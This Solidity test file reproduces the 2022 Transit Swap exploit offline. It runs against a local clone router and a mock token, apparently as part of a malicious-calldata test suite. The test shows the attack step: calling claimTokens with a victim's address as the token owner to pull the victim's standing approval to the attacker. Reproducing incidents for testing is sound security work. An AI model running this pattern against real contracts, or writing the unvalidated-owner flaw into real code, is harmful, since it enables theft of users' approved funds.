// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {TransitSwapClone} from "../fixtures/malicious-calldata/b-incident/TransitSwapClone.sol";

/// @title malicious-calldata tier (b): Transit Swap exploit (2022-10-01, BNB Chain, >$21M).
/// @notice Minimized offline reproduction of the documented mechanism: the router's transfer
///         helper performed transferFrom with a caller-supplied `from` (token owner) that was
///         never validated against msg.sender. The attacker named an innocent user who had
///         approved the router and set `to` to themselves; the router pulled the victim's
///         standing approval. Verdict derived from the real outcome. See PROVENANCE.md.
contract TransitSwapIncidentTest is Test {
    uint256 constant VICTIM_BALANCE = 250_000e18; // representative, scaled
    address constant VICTIM = address(0x7211);
    address constant ATTACKER = address(0xBAD51);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[malicious-calldata] target=", target, " verdict=", verdict));
    }

    function test_transit_unvalidatedOwner_drainsApproval() public {
        MockERC20 token = new MockERC20();
        TransitSwapClone router = new TransitSwapClone();

        // A user holds funds and grants the router an approval (the exploited standing state).
        token.mint(VICTIM, VICTIM_BALANCE);
        vm.prank(VICTIM);
        token.approve(address(router), type(uint256).max);

        // ATTACK: the attacker names the victim as the token `from` and themselves as `to`.
        // claimTokens never checks that `from` is the caller, so the router pulls the victim.
        vm.prank(ATTACKER);
        router.claimTokens(address(token), VICTIM, ATTACKER, VICTIM_BALANCE);

        bool drained = (token.balanceOf(VICTIM) == 0 && token.balanceOf(ATTACKER) == VICTIM_BALANCE);
        _report("transit-claimtokens-victim", drained);

        assertTrue(drained, "unvalidated owner param should drain the victim's approval");
        assertEq(token.balanceOf(ATTACKER), VICTIM_BALANCE, "attacker drained the victim");
    }
}
